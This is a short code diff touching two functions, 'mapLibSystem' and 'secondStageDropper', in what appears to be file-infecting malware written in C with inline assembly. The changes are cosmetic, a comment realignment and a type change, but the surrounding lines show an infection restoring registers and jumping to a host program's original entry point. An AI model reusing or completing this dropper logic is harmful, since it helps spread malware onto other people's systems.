@@ -402,7 +402,7 @@ void *mapLibSystem()
     mov DWORD PTR [esp+16], eax
     mov DWORD PTR [esp+12], 2       // MAP_PRIVATE
     mov DWORD PTR [esp+8], 1        // PROT_READ
-    mov eax, [ebp-0x30]   // st.st_size (win ~46 bytes, osx ~96 bytes)
+    mov eax, [ebp-0x30]             // st.st_size (win ~46 bytes, osx ~96 bytes)
     mov DWORD PTR [esp+4], eax
     mov DWORD PTR [esp], 0
     xor eax, eax
@@ -812,7 +812,7 @@ void secondStageDropper ()
           // Restore register state and jump to the original entrypoint
           //
 #ifdef WIN32
-          unsigned long originalEP = infection->originalEP;
+          uint32_t originalEP = infection->originalEP;
           __asm__ __volatile__ {
             mov eax, [originalEP]
             mov ebx, 0x1000
